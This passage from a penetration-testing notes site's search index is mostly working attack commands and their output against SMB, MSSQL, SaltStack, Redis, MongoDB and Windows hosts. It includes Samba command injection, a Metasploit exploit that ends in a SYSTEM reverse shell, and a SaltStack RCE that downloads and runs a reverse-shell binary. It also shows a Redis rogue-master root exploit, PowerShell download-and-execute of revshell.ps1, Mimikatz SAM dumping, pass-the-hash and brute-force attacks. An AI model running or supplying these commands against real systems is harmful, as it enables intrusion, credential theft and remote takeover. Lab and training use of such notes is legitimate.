~/home/\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#windows","title":"Windows","text":"<pre><code>\\\\ip\\a\\whoami.exe\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#smb-commands","title":"SMB Commands","text":"<pre><code>srvinfo\nenumdomusers\ngetdompwinfo\nquerydominfo\nnetshareenum\nnetshareenumall\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#config-samba","title":"Config Samba","text":"<p><code>/etc/samba/smb.conf</code></p> <pre><code>min protocol = SMB1\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#smb-cve","title":"SMB CVE","text":""},{"location":"network-pentest/common-services/00139-445-smb/#samba-3020-3025rc3-username-map-script","title":"Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script'","text":"<p>https://www.exploit-db.com/exploits/16320</p> <pre><code>smbmap -u '/=`ping -c 2 ip`' -H ip\n</code></pre>"},{"location":"network-pentest/common-services/00139-445-smb/#smb-vuln-cve2009-3103","title":"smb-vuln-cve2009-3103","text":"<p>Using python exploit but not complete, exploit here</p> <p>ExploitDB: https://www.exploit-db.com/exploits/40280</p> <pre><code>$ python3 MS09_050.py ip\nEnter WORKGROUP\\Administrator's password: \nCannot connect to server.  Error was NT_STATUS_LOGON_FAILURE\n</code></pre> <pre><code>$ sudo msfconsole -q\nuse exploit/multi/handler\nset lhost tun0\nset lport 445\nset EXITFUNC thread\nrun\n</code></pre> <p>Using msfconsole</p> <pre><code>msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; show options\n\nModule options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS  ip    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'\n   RPORT   445              yes       The target port (TCP)\n   WAIT    180              yes       The number of seconds to wait for the attack to complete.\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     tun0             yes       The listen address (an interface may be specified)\n   LPORT     445              yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows Vista SP1/SP2 and Server 2008 (x86)\n\n\nmsf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; run\n\n[*] Started reverse TCP handler on ip\n[*] ip:445 - Connecting to the target (ip:445)...\n[*] ip:445 - Sending the exploit packet (951 bytes)...\n[*] ip:445 - Waiting up to 180 seconds for exploit to trigger...\n[*] Sending stage (175174 bytes) to ip\n[*] Meterpreter session 2 opened (ip:445 -&gt; ip:49159) at 2021-07-06 23:40:40 +0700\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>"},{"location":"network-pentest/common-services/00161-199-snmp/","title":"snmp 161","text":""},{"location":"network-pentest/common-services/00161-199-snmp/#scanning","title":"Scanning","text":"<pre><code>sudo nmap -sU --open -p 161 $ip\n</code></pre> <pre><code>snmp-check $ip -p 199 # 161\n</code></pre>"},{"location":"network-pentest/common-services/00161-199-snmp/#entire-mib-tree","title":"Entire MIB Tree","text":""},{"location":"network-pentest/common-services/00161-199-snmp/#script","title":"Script","text":"<p>https://github.com/dheiland-r7/snmp</p> <pre><code>$ ./snmpbw.pl 10.10.10.241 public 2 1\nSNMP query:       10.10.10.241\nQueue count:      0\nSNMP SUCCESS:     10.10.10.241\n</code></pre>"},{"location":"network-pentest/common-services/00161-199-snmp/#manual","title":"Manual","text":"<p>File <code>list_community</code>:</p> <pre><code>public\nprivate\nmanager\n</code></pre> <pre><code>onesixtyone -c list_community -i list_ip\n</code></pre> <pre><code>snmpwalk -c public -v1 -t 10 $ip\n</code></pre> Options Numbers User Accounts snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25 Running Programs snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2 Open TCP Ports snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3 Installed Software snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2 System Processes snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.1.6.0 Processes Path snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.4 Storage Units snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.2.3.1.4"},{"location":"network-pentest/common-services/01443-mssql/","title":"MSSQL","text":""},{"location":"network-pentest/common-services/01443-mssql/#broute-force","title":"Broute Force","text":""},{"location":"network-pentest/common-services/01443-mssql/#file-ms-sql-brute","title":"File ms-sql-brute","text":"<pre><code>nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt &lt;host&gt;\n</code></pre>"},{"location":"network-pentest/common-services/01443-mssql/#connection","title":"Connection","text":""},{"location":"network-pentest/common-services/01443-mssql/#add-server","title":"Add server","text":"<pre><code>$ cat /etc/freetds/freetds.conf\n&lt;snip&gt;\n[Pentest]\n        host = &lt;ip&gt;\n        port = 1433\n</code></pre>"},{"location":"network-pentest/common-services/01443-mssql/#stored-password","title":"Stored password","text":"<pre><code>$ cat ~/.sqshrc\n\\set username=sa\n\\set password=PASSWORD\n\\set style=vert\n$ sqsh -S Pentest\n1&gt;\n</code></pre>"},{"location":"network-pentest/common-services/01443-mssql/#normal-connection","title":"Normal Connection","text":"<pre><code>$ sqsh -S mssql -U sa\nsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray\nPortions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp\nThis is free software with ABSOLUTELY NO WARRANTY\nFor more information type '\\warranty'\nPassword: \n1&gt; \\set style=vert\n1&gt;\n</code></pre>"},{"location":"network-pentest/common-services/01443-mssql/#execute-commands","title":"Execute commands","text":""},{"location":"network-pentest/common-services/01443-mssql/#advanced-option","title":"Advanced Option","text":"<pre><code>1&gt; EXEC sp_configure 'show advanced option';\n2&gt; go\nname:         show advanced options\nminimum:      0\nmaximum:      1\nconfig_value: 0\nrun_value:    0\n\n(return status = 0)\n</code></pre>"},{"location":"network-pentest/common-services/01443-mssql/#config-xp_cmdshell","title":"Config xp_cmdshell","text":"<pre><code>1&gt; EXEC sp_configure 'show advanced option', '1';\n2&gt; go\nConfiguration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.\n(return status = 0)\n1&gt; RECONFIGURE WITH OVERRIDE;\n2&gt; go\n1&gt; EXEC sp_configure 'xp_cmdshell', 1;\n2&gt; go\nConfiguration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.\n(return status = 0)\n1&gt; RECONFIGURE;\n2&gt; go\n=== Recheck ===\n1&gt; EXEC sp_configure 'show advanced option';\n2&gt; go\nname:         show advanced options\nminimum:      0\nmaximum:      1\nconfig_value: 1\nrun_value:    1\n\n(return status = 0)\n------\n</code></pre>"},{"location":"network-pentest/common-services/01443-mssql/#execute-commands_1","title":"Execute commands","text":"<pre><code>1&gt; xp_cmdshell 'whoami';\n2&gt; go\noutput: nt service\\mssql$sqlexpress\n\noutput: NULL\n\n(2 rows affected, return status = 0)\n</code></pre>"},{"location":"network-pentest/common-services/03306-mysql/","title":"mysql 3306","text":""},{"location":"network-pentest/common-services/03306-mysql/#connection","title":"Connection","text":"<pre><code>mysql -h &lt;host&gt; -u &lt;user&gt; -p&lt;pass&gt;\n</code></pre>"},{"location":"network-pentest/common-services/03306-mysql/#query","title":"Query","text":"<pre><code>show databases;\nshow tables;\nuse tables;\nselect * from users;\n</code></pre>"},{"location":"network-pentest/common-services/03306-mysql/#readfile","title":"Readfile","text":"<p>Reading and Writing Files</p> <pre><code>SELECT LOAD_FILE('/etc/passwd')\n</code></pre>"},{"location":"network-pentest/common-services/04505-4506-zmtp/","title":"zmtp 4505,4506","text":""},{"location":"network-pentest/common-services/04505-4506-zmtp/#saltstack-30001-rce","title":"Saltstack 3000.1 - rce","text":"<p>https://www.exploit-db.com/exploits/48421</p> <pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=ip LPORT=4506 -f elf &gt; shell.elf\n</code></pre> <pre><code>python3 exploit.py --master ip --exec \"curl ip:4505/shell.elf -o /tmp/shell\"\npython3 exploit.py --master ip --exec \"chmod +x /tmp/shell\"\npython3 exploit.py --master ip --exec \"/tmp/shell\"\n</code></pre> <pre><code>$ sudo nc -nvlp 4506            \nlistening on [any] 4506 ...\nconnect to [ip] from (UNKNOWN) [ip] 34288\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"network-pentest/common-services/05432-postgresql/","title":"postgresql 5432","text":""},{"location":"network-pentest/common-services/05432-postgresql/#connection","title":"Connection","text":"<pre><code>$ su postgres\nPassword: \n$ psql\npsql (9.4.15)\nType \"help\" for help.\n</code></pre>"},{"location":"network-pentest/common-services/05432-postgresql/#query","title":"Query","text":"<pre><code>postgres=# \\list\npostgres=# \\c database_name\npentesterlab=# \\d\npentesterlab=# select * from users;\n</code></pre>"},{"location":"network-pentest/common-services/05432-postgresql/#readfile","title":"Readfile","text":"<pre><code>$ psql -U photoblog -W photoblog\n# CREATE TABLE demo(t text);\n# COPY demo from '[FILENAME]';\n# SELECT * FROM demo;\n</code></pre>"},{"location":"network-pentest/common-services/06379-redis/","title":"Redis 6379","text":"<p>https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</p>"},{"location":"network-pentest/common-services/06379-redis/#enumeration","title":"Enumeration","text":"<pre><code>nmap --script redis-info -sV -p 6379 &lt;IP&gt;\n</code></pre> <pre><code>nc -vn 10.10.10.10 6379\nredis-cli -h 10.10.10.10 # sudo apt-get install redis-tools\n</code></pre>"},{"location":"network-pentest/common-services/06379-redis/#redis-4x-5x-unauthenticated-code-execution","title":"Redis 4.x / 5.x - Unauthenticated Code Execution","text":"<p>https://github.com/vulhub/redis-rogue-getshell</p> <pre><code>cd RedisModulesSDK/exp/\nsudo make\ncd RedisModulesSDK/\nsudo make\n</code></pre> <pre><code>$ sudo python3 redis-master.py -r target -p 6379 -L myip -P 6379 -f RedisModulesSDK/exp.so -c \"id\"\n&gt;&gt; send data: b'*3\\r\\n$7\\r\\nSLAVEOF\\r\\n$14\\r\\nip\\r\\n$4\\r\\n6379\\r\\n'\n&gt;&gt; receive data: b'+OK\\r\\n'\n&gt;&gt; send data: b'*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$6\\r\\nexp.so\\r\\n'\n&gt;&gt; receive data: b'+OK\\r\\n'\n&gt;&gt; receive data: b'*1\\r\\n$4\\r\\nPING\\r\\n'\n&gt;&gt; receive data: b'*3\\r\\n$8\\r\\nREPLCONF\\r\\n$14\\r\\nlistening-port\\r\\n$4\\r\\n6379\\r\\n'\n&gt;&gt; receive data: b'*5\\r\\n$8\\r\\nREPLCONF\\r\\n$4\\r\\ncapa\\r\\n$3\\r\\neof\\r\\n$4\\r\\ncapa\\r\\n$6\\r\\npsync2\\r\\n'\n&gt;&gt; receive data: b'*3\\r\\n$5\\r\\nPSYNC\\r\\n$40\\r\\n53c8ubb260c5a95b8f9ecc4701a957edb7236d44\\r\\n$1\\r\\n1\\r\\n'\n&gt;&gt; send data: b'*3\\r\\n$6\\r\\nMODULE\\r\\n$4\\r\\nLOAD\\r\\n$8\\r\\n./exp.so\\r\\n'\n&gt;&gt; receive data: b'+OK\\r\\n'\n&gt;&gt; send data: b'*3\\r\\n$7\\r\\nSLAVEOF\\r\\n$2\\r\\nNO\\r\\n$3\\r\\nONE\\r\\n'\n&gt;&gt; receive data: b'+OK\\r\\n'\n&gt;&gt; send data: b'*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$8\\r\\ndump.rdb\\r\\n'\n&gt;&gt; receive data: b'+OK\\r\\n'\n&gt;&gt; send data: b'*2\\r\\n$11\\r\\nsystem.exec\\r\\n$2\\r\\nid\\r\\n'\n&gt;&gt; receive data: b'$40\\r\\neuid=0(root) gid=0(root) groups=0(root)\\n\\r\\n'\neuid=0(root) gid=0(root) groups=0(root)\n\n&gt;&gt; send data: b'*3\\r\\n$6\\r\\nMODULE\\r\\n$6\\r\\nUNLOAD\\r\\n$6\\r\\nsystem\\r\\n'\n&gt;&gt; receive data: b'+OK\\r\\n'\n</code></pre>"},{"location":"network-pentest/common-services/27017-mongodb/","title":"MongoDB 27017","text":""},{"location":"network-pentest/common-services/27017-mongodb/#scram-crack","title":"Scram Crack","text":"<pre><code>$ python3 scram-crack.py \nTried 1000 passwords\nTried 2000 passwords\nTried 3000 passwords\nTried 4000 passwords\nPassword found: password123\n</code></pre>"},{"location":"network-pentest/common-services/27017-mongodb/#connect-mongodb","title":"Connect MongoDB","text":"<pre><code>mongo 'mongodb://admin:password123@mongodb0.examples.com'\n</code></pre> <pre><code>mongo --host mongodb0.examples.com --port 28015 -u \"alice\" -p \"password123\"\"\n</code></pre>"},{"location":"network-pentest/common-services/27017-mongodb/#using-mongodb","title":"Using MongoDB","text":"<p>Step 1: See all your databases:</p> <pre><code>show dbs\n</code></pre> <p>Step 2: Select the database</p> <pre><code>use your_database_name\n</code></pre> <p>Step 3: Show the collections</p> <pre><code>show collections\n</code></pre> <p>This will list all the collections in your selected database.</p> <p>Step 4: See all the data</p> <pre><code>db.collection_name.find()\n</code></pre> <pre><code>db.collection_name.find().pretty()\n</code></pre>"},{"location":"network-pentest/common-services/27017-mongodb/#find-and-update-user","title":"Find and update user","text":"<p>Find <code>user:1</code> in collection object</p> <pre><code>db.objects.find({ _key: /^user:1$/ })\n</code></pre> <p>Update password for <code>user:1</code></p> <pre><code>db.objects.update({ _key: /^user:1$/ }, { $set: { password: \"$2y$12$LMqnkbq1FpTnOzAWTgizbugAOpGJaKl0h7PVHvDraW9e0wK2SR7Zu\" }})\nWriteResult({ \"nMatched\" : 1, \"nUpserted\" : 0, \"nModified\" : 1 })\n</code></pre>"},{"location":"network-pentest/file-transfer/","title":"File Transfer","text":""},{"location":"network-pentest/file-transfer/#wget-curl-axel-certutil","title":"wget, curl, axel, certutil","text":"<p>Server</p> pythonrubyphpbusyboxapache2 <pre><code>python3 -m http.server 80\n</code></pre> <pre><code>python -m SimpleHTTPServer 80\n</code></pre> <pre><code>ruby -run -e httpd . -p 80\n</code></pre> <pre><code>php -S 0.0.0.0:80\n</code></pre> <pre><code>busybox httpd -f -p 80\n</code></pre> <pre><code>sudo systemctl start apache2\n</code></pre> <p>Client</p> wgetcurlaxelcertutil <pre><code>wget -O /tmp/shell http://ip/shell.elf\n\nwget &lt;uri&gt; -P /path/to/\n</code></pre> <pre><code>curl -o /tmp/shell http://ip/shell.elf\n</code></pre> <pre><code>axel -a -n 20 -o /tmp/shell http://ip/shell.elf\n</code></pre> <pre><code>certutil.exe -urlcache -f http://&lt;url&gt;/shell.exe C:\\\\inetpub\\\\wwwroot\\\\shell.exe\n</code></pre>"},{"location":"network-pentest/file-transfer/#socat","title":"Socat","text":"<p>Kali machine</p> <pre><code>sudo socat TCP4-LISTEN:443,fork file:shell.exe\n</code></pre> <p>Windows machine</p> <pre><code>socat TCP4:ip:443 file:shell.exe,create\n</code></pre>"},{"location":"network-pentest/file-transfer/#netcat","title":"Netcat","text":"<p>Kali machine</p> <pre><code>nc -nvlp 4444 &lt; /usr/share/windows-resources/binaries/wget.exe\n</code></pre> <p>Windows machine</p> <pre><code>nc -nv ip 4444 &gt; wget.exe\n</code></pre>"},{"location":"network-pentest/file-transfer/#scp-command","title":"SCP Command","text":"<p>How to Use SCP Command to Securely Transfer Files</p> <pre><code>scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2\n</code></pre> <p>To copy a file from a local to a remote system run the following command:</p> <pre><code>scp -P 2322 file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt\n</code></pre> <p>To copy a directory from a local to remote system, use the -r option:</p> <pre><code>scp -r /local/directory remote_username@10.10.0.2:/remote/directory\n</code></pre> <pre><code>scp remote_username@10.10.0.2:/remote/file.txt /local/directory\n</code></pre>"},{"location":"network-pentest/file-transfer/#upload-files-php-server","title":"Upload files PHP Server","text":"<p>Kali Machine</p> <pre><code>&lt;?php\n$uploaddir = '/var/www/uploads/';\n\n$uploadfile= $uploaddir . $_FILES['file']['name'];\n\nmove_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)\n?&gt;\n</code></pre> <p>Client</p> <p>PowerShell</p> <pre><code>(New-Object System.Net.WebClient).UploadFile('http://ip/upload.php', 'test.txt')\n</code></pre> <p>curl</p> <pre><code>curl -F \"file=@nc.cmd\" http://ip/upload.php\n</code></pre>"},{"location":"network-pentest/file-transfer/#ftp-services","title":"FTP Services","text":""},{"location":"network-pentest/file-transfer/#ftp-server","title":"FTP Server","text":"<p>Install</p> <pre><code>sudo apt-get install vsftpd\nsudo service vsftpd start\n</code></pre> <p>Anonymous access <code>/etc/vsftpd.conf</code></p> <pre><code>anonymous_enable=YES\n</code></pre>"},{"location":"network-pentest/file-transfer/#pure-ftpd","title":"Pure-FTPd","text":"Clientsetup-ftp.sh <p>ftp.txt</p> <pre><code>open ip 21\nUSER hades\npasswd\nbin\nGET nc.exe\nquit\n</code></pre> <pre><code>ftp -v -n -s:ftp.txt\n</code></pre> <pre><code>groupadd ftpgroup\nuseradd -g ftpgroup -d /dev/null -s /etc ftpuser\npure-pw useradd hades -u ftpuser -d /ftphome\npure-pw mkdb\ncd /etc/pure-ftpd/auth/\nln -s ../conf/PureDB 60pdb\nmkdir -p /ftphome\nchown -R ftpuser:ftpgroup /ftphome/\nsystemctl restart pure-ftpd\n</code></pre>"},{"location":"network-pentest/file-transfer/#tftp","title":"TFTP","text":"<p>Server</p> <pre><code>sudo apt update &amp;&amp; sudo apt install atftp\nsudo mkdir /tftp\nsudo chown nobody: /tftp\nsudo atftpd --daemon --port 69 /tftp\n</code></pre> <p>Checking running service</p> <pre><code>$ getent services tftp\ntftp                  69/udp\n</code></pre> <p>Client</p> <pre><code>tftp -i ip put test.txt\n</code></pre>"},{"location":"network-pentest/file-transfer/#windows","title":"Windows","text":""},{"location":"network-pentest/file-transfer/#powershell","title":"PowerShell","text":"<p>Kali machine</p> <pre><code>sudo python3 -m http.server 80\n</code></pre> <p>Executing a remote PowerShell script</p> <pre><code>powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://ip/revshell.ps1')\n</code></pre> <p>Windows machine</p> <pre><code>(new-object System.Net.WebClient).DownloadFile(\"http://192.168.11.145/wget.exe\",\"C:\\Users\\Public\\wget.exe\")\n</code></pre> ps1 scriptwget.ps1.txt <pre><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1\n</code></pre> <pre><code>echo $webclient = New-Object System.Net.WebClient &gt;&gt; wget.ps1\necho $url = \"http://ip/nc.exe\" &gt;&gt; wget.ps1\necho $file = \"nc.exe\" &gt;&gt; wget.ps1\necho $webclient.DownloadFile($url,$file) &gt;&gt; wget.ps1\n</code></pre>"},{"location":"network-pentest/file-transfer/#powercat","title":"Powercat","text":"Bypass policyDownload and execute from internetLocal machine <pre><code>Set-ExecutionPolicy Unrestricted\n</code></pre> <pre><code>iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')\n</code></pre> <pre><code>. .\\powercat.ps1\n</code></pre> <p>Kali machine</p> <pre><code>sudo nc -lnvp 443 &gt; powercat.ps1\n</code></pre> <p>Windows machine</p> <pre><code>powercat -c ip -p 443 -i C:\\Users\\Public\\powercat.ps1\n</code></pre>"},{"location":"network-pentest/file-transfer/#vbscript","title":"VBScript","text":"commandwget.vbs.txt <p>Paste and execute <code>wget.vbs</code> script to the Windows machine.</p> <pre><code>cscript wget.vbs http://&lt;url&gt;/shell.exe shell.exe\n</code></pre> <pre><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs\necho StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs\necho Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs\necho Err.Clear &gt;&gt; wget.vbs\necho Set http = Nothing &gt;&gt; wget.vbs\necho Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") &gt;&gt; wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") &gt;&gt; wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") &gt;&gt; wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") &gt;&gt; wget.vbs\necho http.Open \"GET\", strURL, False &gt;&gt; wget.vbs\necho http.Send &gt;&gt; wget.vbs\necho varByteArray = http.ResponseBody &gt;&gt; wget.vbs\necho Set http = Nothing &gt;&gt; wget.vbs\necho Set fs = CreateObject(\"Scripting.FileSystemObject\") &gt;&gt; wget.vbs\necho Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs\necho strData = \"\" &gt;&gt; wget.vbs\necho strBuffer = \"\" &gt;&gt; wget.vbs\necho For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs\necho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs\necho Next &gt;&gt; wget.vbs\necho ts.Close &gt;&gt; wget.vbs\n</code></pre>"},{"location":"network-pentest/file-transfer/#hex-string","title":"Hex String","text":"<p>Smaller file</p> <pre><code>upx -9 nc.exe\n</code></pre> <pre><code>exe2hex -x nc.exe -p nc.cmd\n</code></pre>"},{"location":"network-pentest/file-transfer/#smb-protocol","title":"SMB Protocol","text":"<p>Install</p> <pre><code>git clone https://github.com/SecureAuthCorp/impacket.git\ncd impacket\nsudo pip install -r requirements.txt\nsudo python3 setup.py install\n</code></pre> <p>SMB Server</p> <pre><code>$ locate whoami.exe\n/usr/share/windows-resources/binaries/whoami.exe\n</code></pre> <pre><code>smbserver.py a /usr/share/windows-binaries/\n</code></pre> <pre><code>sudo impacket-smbserver a .\n</code></pre> <p>SMB Client</p> <pre><code>\\\\&lt;ip_server&gt;\\a\\whoami.exe\n</code></pre>"},{"location":"network-pentest/password-attack/","title":"Password Attacks","text":""},{"location":"network-pentest/password-attack/#generate-wordlists","title":"Generate Wordlists","text":"<ul> <li> <p><code>/usr/share/wordlists</code></p> </li> <li> <p><code>/usr/share/seclists</code></p> </li> </ul>"},{"location":"network-pentest/password-attack/#crunch","title":"crunch","text":"Generationcrunch options <pre><code>crunch 5 5 -t ,@@^% -o password.txt\n</code></pre> <pre><code>crunch 10 10 0123456789 -t 2343@@@@@@ -o passwd.txt\n</code></pre> <p>Using <code>/usr/share/crunch/charset.lst</code></p> <pre><code>crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o crunch.txt\n</code></pre> Placeholder Character Translation @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including space"},{"location":"network-pentest/password-attack/#cewl","title":"cewl","text":"<pre><code>cewl $url -m 6 -w wordlists.txt\n</code></pre>"},{"location":"network-pentest/password-attack/#johnconf-rules","title":"john.conf Rules","text":"<p><code>/etc/john/john.conf</code> &gt; <code>[List.Rules:Wordlist]</code></p> <pre><code>john --wordlist=passwd.txt --rules --stdout &gt; pass-rules.txt\n</code></pre>"},{"location":"network-pentest/password-attack/#common-services","title":"Common Services","text":""},{"location":"network-pentest/password-attack/#http-htaccess-attack","title":"HTTP htaccess Attack","text":"<p>How To Set Up Password Authentication with Apache on Ubuntu 14.04</p> <pre><code>medusa -h 127.0.0.1 -u kali -P ./pass.txt -M http -m DIR:/\n</code></pre>"},{"location":"network-pentest/password-attack/#rdp-attack","title":"RDP Attack","text":"<pre><code>crowbar -b rdp -s 192.168.11.135/32 -u windows_10_1903_x64 -C ./pass.txt -n 4\n</code></pre>"},{"location":"network-pentest/password-attack/#ssh-attack","title":"SSH Attack","text":"<pre><code>hydra -l kali -P ./pass.txt ssh://127.0.0.1\n</code></pre>"},{"location":"network-pentest/password-attack/#http-post-attack","title":"HTTP POST Attack","text":"<pre><code>hydra -l admin -P ./pass.txt 192.168.11.135 http-form-post \"/admin.php:user=admin&amp;pass=^PASS^:INVALID CREDENTIALS\" -vV -f\n</code></pre>"},{"location":"network-pentest/password-attack/#leveraging-password-hashes","title":"Leveraging Password Hashes","text":""},{"location":"network-pentest/password-attack/#retrieving-password-hashes","title":"Retrieving Password Hashes","text":"<p>How to identify hash types</p> <p>Generate password for new user</p> <pre><code>openssl passwd -1 -salt hades leecybersec &gt; hash.txt\n</code></pre> <pre><code>hashid -m hash.txt\n</code></pre> <pre><code>john --wordlist=./pass.txt hash.txt\n</code></pre>"},{"location":"network-pentest/password-attack/#passing-the-hash-in-windows","title":"Passing the Hash in Windows","text":"<p>Intro to Windows hashes</p> <p>Mimikatz.exe</p> <pre><code>privilege::debug\ntoken::elevate\nlsadump::sam\n</code></pre> <p>Pass-The-Hash</p> <p>Using smbmap</p> <p>List directory at folder Desktop</p> <pre><code>smbmap -H 192.168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' -r 'Users\\windows_10_1903_x64\\Desktop'\n</code></pre> <p>Download file <code>41542.c</code> in Windows 10</p> <pre><code>smbmap -H 192.168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' --download 'Users\\windows_10_1903_x64\\Desktop\\41542.c'\n</code></pre> <p>pth-winexe</p> <pre><code>pth-winexe -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd\n</code></pre> <p>pth-wmis</p> <pre><code>pth-wmis -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd\n</code></pre> <p>xfreerdp</p> <pre><code>xfreerdp /v:192.168.11.135 /u:windows_10_1903_x64 /pth:68bdacb06923faed9dc32661308f594e\n</code></pre> <p>wmiexec.py</p> <pre><code>wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e windows_10_1903_x64@192.168.11.135\n</code></pre>"},{"location":"network-pentest/password-attack/#password-cracking","title":"Password Cracking","text":"<pre><code>john --wordlist=./pass.txt hash.txt\n</code></pre> <pre><code>unshadow passwd shadow &gt; hash\n</code></pre> <pre><code>john --rules --wordlist=./pass.txt hash\n</code></pre> <p>https://hashcat.net</p>"},{"location":"network-pentest/port-redirection-tunneling/","title":"Port Redirection &amp; Tunneling","text":""},{"location":"network-pentest/port-redirection-tunneling/#port-redirection","title":"Port Redirection","text":""},{"location":"network-pentest/port-redirection-tunneling/#rinetd","title":"RINETD","text":"<pre><code>nano /etc/rinetd.conf\n</code></pre> <p>Add forword from kali linux port 80 to ip port 80.</p> <pre><code># bindadress    bindport  connectaddress  connectport\n0.0.0.0 80 192.168.11.1 80\n</code></pre> <p>Restart RINETD service</p> <pre><code>sudo service rinetd restart\n</code></pre> <p>Checking running service at port 80</p> <pre><code>ss -antp | grep 80\n</code></pre>"},{"location":"network-pentest/port-redirection-tunneling/#ssh-tunneling","title":"SSH Tunneling","text":""},{"location":"network-pentest/port-redirection-tunneling/#local-forwarding","title":"Local Forwarding","text":"<pre><code>ssh -N -L [bind_address:]port:host:hostport [username@address]\n</code></pre> <ul> <li><code>-N</code> Don't need to execute code</li> <li><code>-L</code> Local forward</li> <li><code>0.0.0.0:80</code> Bind port 80 at Kali Machine</li> <li><code>10.10.10.9:80</code> Forward traffic to target IP</li> <li><code>hades@192.168.11.133</code> Compromised machine</li> </ul> <pre><code>sudo ssh -N -L 0.0.0.0:9001:10.10.10.10:8080 hades@192.168.11.133 -i ./.ssh/id_rsa\n</code></pre>"},{"location":"network-pentest/port-redirection-tunneling/#remote-forwarding","title":"Remote Forwarding","text":"<pre><code>ssh -N -R [bind_address:]port:host:hostport [username@address]\n</code></pre> <pre><code>ssh -N -R 0.0.0.0:9001:10.10.10.10:80 kali@myip -i /home/hades/.ssh/kali-idrsa\n</code></pre>"},{"location":"network-pentest/port-redirection-tunneling/#dynamic-forwarding","title":"Dynamic Forwarding","text":"<pre><code>ssh -N -D &lt;address to bind to&gt;:&lt;port to bind to&gt; &lt;username&gt;@&lt;SSH server address&gt;\n</code></pre> <pre><code>ssh -N -D 127.0.0.1:9001 hades@192.168.11.135 -i .ssh/id_rsa\n</code></pre> <p><code>/etc/proxychains.conf</code></p> <pre><code>socks4 127.0.0.1 9001\n</code></pre> <p>Using <code>proxychains</code> to use the proxy</p> <pre><code>proxychains smbclient -L 192.168.35.129\n</code></pre> <pre><code>sudo proxychains nmap --top-ports=5 -Pn -sT 192.168.35.129\n</code></pre>"},{"location":"network-pentest/port-redirection-tunneling/#plinkexe","title":"Plink.exe","text":"<pre><code>plink.exe -ssh -l user -pw passwd -R 0.0.0.0:9001:needed-access-ip:12345 myip\n</code></pre> <p>Answer command trick using <code>echo</code></p> <pre><code>cmd.exe /c echo y | plink.exe -ssh -l user -pw passwd -R 0.0.0.0:9001:needed-access-ip:12345 